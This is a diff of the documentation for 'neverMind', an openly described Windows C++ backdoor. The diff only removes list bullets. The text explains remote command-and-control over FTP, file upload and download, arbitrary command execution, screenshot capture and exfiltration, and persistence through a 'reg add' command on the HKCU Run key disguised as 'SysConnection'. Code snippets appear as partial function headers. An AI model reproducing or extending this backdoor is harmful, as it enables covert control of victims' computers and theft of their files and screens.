@@ -25,23 +25,23 @@ the gist of how `neverMind` works is simple: the program is controlled remotely 
 
 ## flow
 
-1. **initialization**: the program begins by creating an instance of the `neverMind` class, which takes the FTP server's host, username, and password as parameters. this instance is used to manage the backdoor's operations.
+**initialization**: the program begins by creating an instance of the `neverMind` class, which takes the FTP server's host, username, and password as parameters. this instance is used to manage the backdoor's operations.
 
-2. **setup**: if the backdoor hasn't been set up before, the `setup` method in the `neverMind` class creates the necessary directories and adds the backdoor to the registry for persistence.
+**setup**: if the backdoor hasn't been set up before, the `setup` method in the `neverMind` class creates the necessary directories and adds the backdoor to the registry for persistence.
 
-3. **command execution**: the `start` method in the `neverMind` class is the main driver of the program. it connects to the FTP server, downloads the `cmd.txt` file, compiles + executes the commands, and then uploads the `output.txt` file.
+**command execution**: the `start` method in the `neverMind` class is the main driver of the program. it connects to the FTP server, downloads the `cmd.txt` file, compiles + executes the commands, and then uploads the `output.txt` file.
 
-4. **command compilation**: the `compile` method reads the `cmd.txt` file, splits each line into a vector of strings, and then executes each command.
+**command compilation**: the `compile` method reads the `cmd.txt` file, splits each line into a vector of strings, and then executes each command.
 
-5. **command handling**: the `execute` method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: `print`, `screen`, `upload`, `download`, `exec`.
+**command handling**: the `execute` method takes a vector of strings as input and executes the corresponding command. the supported commands are the same as above: `print`, `screen`, `upload`, `download`, `exec`.
 
-6. **FTP operations**: the `neverMind` class uses an instance of the `ftpC` class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.
+**FTP operations**: the `neverMind` class uses an instance of the `ftpC` class to handle FTP operations, including connecting to the server, uploading/downloading files, and creating/switching directories.
 
-7. **utility functions**: the `wrapper` class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.
+**utility functions**: the `wrapper` class provides utility functions for file I/O, error handling, directory listing, random string generation, date retrieval, bitmap creation, screen capturing, and memory saving.
 
-8. **persistence**: the program adds itself to the registry to ensure it runs every time the system starts.
+**persistence**: the program adds itself to the registry to ensure it runs every time the system starts.
 
-9. **cleanup**: when the program is done, it closes the FTP + internet connections in the `ftpC` class destructor.
+**cleanup**: when the program is done, it closes the FTP + internet connections in the `ftpC` class destructor.
 
 ## code
 
@@ -51,7 +51,7 @@ the `wrapper` class defined in `wrapper.h` and implemented in `wrapper.cpp` prov
 
 #### file operations
 
-- `read_file(const std::string& file_path)`: reads the content of a file located at `file_path` and returns it as a string. If the file cannot be opened, it throws a `FileError` exception.
+`read_file(const std::string& file_path)`: reads the content of a file located at `file_path` and returns it as a string. If the file cannot be opened, it throws a `FileError` exception.
 
 ```cpp
 std::string wrapper::read_file(const std::string &file_path)
@@ -68,7 +68,7 @@ std::string wrapper::read_file(const std::string &file_path)
     }
 ```
 
-- `write_file(const std::string& file_path, const std::string& content)`: writes content to a file located at `file_path`. if the file cannot be opened, it throws a `FileError` exception.
+`write_file(const std::string& file_path, const std::string& content)`: writes content to a file located at `file_path`. if the file cannot be opened, it throws a `FileError` exception.
 
 ```cpp
 void wrapper::write_file(const std::string &file_path, const std::string &content)
@@ -80,7 +80,7 @@ void wrapper::write_file(const std::string &file_path, const std::string &conten
     }
 ```
 
-- `append_file(const std::string& file_path, const std::string& content)`: appends content to a file located at `file_path`. if the file cannot be opened, it throws a `FileError` exception.
+`append_file(const std::string& file_path, const std::string& content)`: appends content to a file located at `file_path`. if the file cannot be opened, it throws a `FileError` exception.
 
 ```cpp
 void wrapper::append_file(const std::string& file_path, const std::string& content)
@@ -92,7 +92,7 @@ void wrapper::append_file(const std::string& file_path, const std::string& conte
     }
 ```
 
-- `path_exists(const std::string& path)`: checks if a path exists in the file system and returns a boolean value indicating the result.
+`path_exists(const std::string& path)`: checks if a path exists in the file system and returns a boolean value indicating the result.
 
 ```cpp
 bool wrapper::path_exists(const std::string& path)
@@ -103,7 +103,7 @@ bool wrapper::path_exists(const std::string& path)
 
 #### system information retrieval
 
-- `get_username()`: retrieves the username of the current user from the environment variables.
+`get_username()`: retrieves the username of the current user from the environment variables.
 
 ```cpp
 std::string wrapper::get_username()
@@ -116,7 +116,7 @@ std::string wrapper::get_username()
     }
 ```
 
-- `last_error_string()`: Retrieves the last error message recorded by the system.
+`last_error_string()`: Retrieves the last error message recorded by the system.
 
 ```cpp
 std::string wrapper::last_error_string()
@@ -132,7 +132,7 @@ std::string wrapper::last_error_string()
     }
 ```
 
-- `listdir(const std::string& path)`: Lists the contents of a directory specified by path and returns them as a vector of strings.
+`listdir(const std::string& path)`: Lists the contents of a directory specified by path and returns them as a vector of strings.
 
 ```cpp
 std::vector<std::string> wrapper::listdir(const std::string& path)
@@ -147,7 +147,7 @@ std::vector<std::string> wrapper::listdir(const std::string& path)
     }
 ```
 
-- `get_date()`: Returns the current date and time as a string in the format "dd-mm-yyyy_hh-mm-ss".
+`get_date()`: Returns the current date and time as a string in the format "dd-mm-yyyy_hh-mm-ss".
 
 ```cpp
 std::string wrapper::get_date()
@@ -162,7 +162,7 @@ std::string wrapper::get_date()
 
 #### screen capture
 
-- `createBitmapHeader(int width, int height)`: creates a bitmap header with the specified width and height.
+`createBitmapHeader(int width, int height)`: creates a bitmap header with the specified width and height.
 
 ```cpp
 BITMAPINFOHEADER wrapper::createBitmapHeader(int width, int height)
@@ -183,7 +183,7 @@ BITMAPINFOHEADER wrapper::createBitmapHeader(int width, int height)
 }
 ```
 
-- `GdiPlusScreenCapture(HWND hWnd)`: captures the screen of the window specified by `hWnd` and returns a handle to the bitmap of the screenshot.
+`GdiPlusScreenCapture(HWND hWnd)`: captures the screen of the window specified by `hWnd` and returns a handle to the bitmap of the screenshot.
 
 ```cpp
 HBITMAP wrapper::GdiPlusScreenCapture(HWND hWnd)
@@ -208,7 +208,7 @@ HBITMAP wrapper::GdiPlusScreenCapture(HWND hWnd)
 ```
 
 
-- `saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat)`: saves a bitmap specified by `hbitmap` to memory in the format specified by `dataFormat` and stores the data in data.
+`saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat)`: saves a bitmap specified by `hbitmap` to memory in the format specified by `dataFormat` and stores the data in data.
 
 ```cpp
 bool wrapper::saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::string dataFormat)
@@ -237,7 +237,7 @@ bool wrapper::saveToMemory(HBITMAP* hbitmap, std::vector<BYTE>& data, std::strin
 }
 ```
 
-- `screenshot(const std::string& path)`: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.
+`screenshot(const std::string& path)`: takes a screenshot, saves it as a JPEG file in the directory specified by path, and returns the full path of the screenshot file.
 
 ```cpp
 std::string wrapper::screenshot(const std::string& path)
@@ -270,7 +270,7 @@ the `ftpC` class defined in `ftp.h` and implemented in `ftp.cpp` provides a set 
 
 #### constructor + destructor
 
-- `ftpC(const std::string& host, const std::string& username, const std::string& password)`: the constructor initializes the FTP connection with the provided host, username, and password. 
+`ftpC(const std::string& host, const std::string& username, const std::string& password)`: the constructor initializes the FTP connection with the provided host, username, and password. 
 
 ```cpp
 ftpC::ftpC(const std::string& host, const std::string& username, const std::string& password)
@@ -279,7 +279,7 @@ ftpC::ftpC(const std::string& host, const std::string& username, const std::stri
     }
 ```
 
-- `~ftpC()`: the destructor cleans up the FTP connection by closing the internet + FTP handles.
+`~ftpC()`: the destructor cleans up the FTP connection by closing the internet + FTP handles.
 
 ```cpp
 ftpC::~ftpC()
@@ -299,7 +299,7 @@ ftpC::~ftpC()
 
 #### FTP operations
 
-- `connect()`: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error. 
+`connect()`: this function opens an internet connection and connects to the FTP server using the provided host, username, and password. if it fails to open the connection or connect to the FTP server, it throws a runtime error. 
 
 ```cpp
 void ftpC::connect()
@@ -328,7 +328,7 @@ void ftpC::connect()
     }
 ```
 
-- `upload_file(const std::string& local_path, const std::string& server_name)`: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.
+`upload_file(const std::string& local_path, const std::string& server_name)`: this function uploads a file from the local path to the FTP server with the specified server name. it returns true if the upload is successful.
 
 ```cpp
 bool ftpC::upload_file(const std::string& local_path, const std::string& server_name)
@@ -338,7 +338,7 @@ bool ftpC::upload_file(const std::string& local_path, const std::string& server_
     }
 ```
 
-- `retr_file(const std::string& local_path, const std::string& server_name)`: this function downloads a file from the FTP server to the local path. 
+`retr_file(const std::string& local_path, const std::string& server_name)`: this function downloads a file from the FTP server to the local path. 
 
 ```cpp
 bool ftpC::retr_file(const std::string& local_path, const std::string& server_name)
@@ -348,7 +348,7 @@ bool ftpC::retr_file(const std::string& local_path, const std::string& server_na
     }
 ```
 
-- `mkdir(const std::string& folder_name)`: this function creates a new directory on the FTP server with the specified folder name.
+`mkdir(const std::string& folder_name)`: this function creates a new directory on the FTP server with the specified folder name.
 
 ```cpp
 bool ftpC::mkdir(const std::string& folder_name)
@@ -358,7 +358,7 @@ bool ftpC::mkdir(const std::string& folder_name)
     }
 ```
 
-- `cd(const std::string& server_path)`: this function changes the current directory on the FTP server to the directory specified by `server_path`.
+`cd(const std::string& server_path)`: this function changes the current directory on the FTP server to the directory specified by `server_path`.
 
 ```cpp
 bool ftpC::cd(const std::string& server_path)
@@ -374,7 +374,7 @@ the `neverMind` class defined in `neverMind.h` and implemented in `neverMind.cpp
 
 #### constructor + destructor
 
-- `neverMind(const std::string &host, const std::string &username, const std::string &password)`: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.
+`neverMind(const std::string &host, const std::string &username, const std::string &password)`: the constructor initializes the backdoor with the provided FTP host, username, and password. it also sets up paths for the backdoor.
 
 ```cpp
 neverMind::neverMind(const std::string &host, const std::string &username, const std::string &password)
@@ -383,7 +383,7 @@ neverMind::neverMind(const std::string &host, const std::string &username, const
     }
 ```
 
-- `~neverMind()`: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!
+`~neverMind()`: the destructor is empty as there are no specific resources that need to be cleaned up. this can be modified by you!
 
 ```cpp
 neverMind::~neverMind()
@@ -393,7 +393,7 @@ neverMind::~neverMind()
 
 #### backdoor operations 
 
-- `start()`: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.
+`start()`: this function opens the backdoor, sets up necessary directories, connects to the FTP server, downloads + executes commands, and manages the registry.
 
 ```cpp
 void neverMind::start()
@@ -415,7 +415,7 @@ void neverMind::start()
     }
 ```
 
-- `setup()`: this function sets up necessary directories and adds the backdoor to the registry for persistence.
+`setup()`: this function sets up necessary directories and adds the backdoor to the registry for persistence.
 
 ```cpp
 void neverMind::setup()
@@ -427,7 +427,7 @@ void neverMind::setup()
     }
 ```
 
-- `add_to_reg()`: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \"" + dest + "\"` adds a new entry `SysConnection` to the `Run` key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.
+`add_to_reg()`: this function adds the backdoor to the registry for persistence. it copies the current executable to a new location and adds it to the startup registry key. the command `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysConnection /t REG_SZ /d \"" + dest + "\"` adds a new entry `SysConnection` to the `Run` key in the Windows Registry. the entry contains the path of the neverMind executable. as a result, the backdoor will be executed every time the user logs on to Windows.
 
 ```cpp
 void neverMind::add_to_reg()
@@ -443,7 +443,7 @@ void neverMind::add_to_reg()
     }
 ```
 
-- `compile(const std::string &file_path)`: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.
+`compile(const std::string &file_path)`: this function compiles + executes commands from a file. it reads the file, splits each line into commands, and executes them.
 
 ```cpp
 void neverMind::compile(const std::string &file_path)
@@ -469,7 +469,7 @@ void neverMind::compile(const std::string &file_path)
     }
 ```
 
-- `execute(const std::vector<std::string>& spl_line)`: this function executes the provided commands. it supports several commands like `print`, `screen`, `upload`, `download`, `exec`. each command performs a specific operation and writes the result to the output file.
+`execute(const std::vector<std::string>& spl_line)`: this function executes the provided commands. it supports several commands like `print`, `screen`, `upload`, `download`, `exec`. each command performs a specific operation and writes the result to the output file.
 
 ```cpp
 void neverMind::execute(const std::vector<std::string>& spl_line)
@@ -569,13 +569,13 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR szCmdLin
 }
 ```
 
-- `HINSTANCE hInstance`: a handle to the current instance of the application.
+`HINSTANCE hInstance`: a handle to the current instance of the application.
 
-- `HINSTANCE hPrevInstance`: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.
+`HINSTANCE hPrevInstance`: a handle to the previous instance of the application. this parameter is always NULL in modern Windows applications.
 
-- `PWSTR szCmdLine`: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.
+`PWSTR szCmdLine`: a pointer to a null-terminated string specifying the command line for the application, excluding the program name.
 
-- `int CmdShow`: controls how the window is to be shown. this parameter can be one of the following values: `SW_HIDE`, `SW_MAXIMIZE`, `SW_MINIMIZE`, `SW_RESTORE`, `SW_SHOW`, `SW_SHOWDEFAULT`, `SW_SHOWMAXIMIZED`, `SW_SHOWMINIMIZED`, `SW_SHOWMINNOACTIVE`, `SW_SHOWNA`, `SW_SHOWNOACTIVATE`, `SW_SHOWNORMAL`.
+`int CmdShow`: controls how the window is to be shown. this parameter can be one of the following values: `SW_HIDE`, `SW_MAXIMIZE`, `SW_MINIMIZE`, `SW_RESTORE`, `SW_SHOW`, `SW_SHOWDEFAULT`, `SW_SHOWMAXIMIZED`, `SW_SHOWMINIMIZED`, `SW_SHOWMINNOACTIVE`, `SW_SHOWNA`, `SW_SHOWNOACTIVATE`, `SW_SHOWNORMAL`.
 
 
 ## conclusion
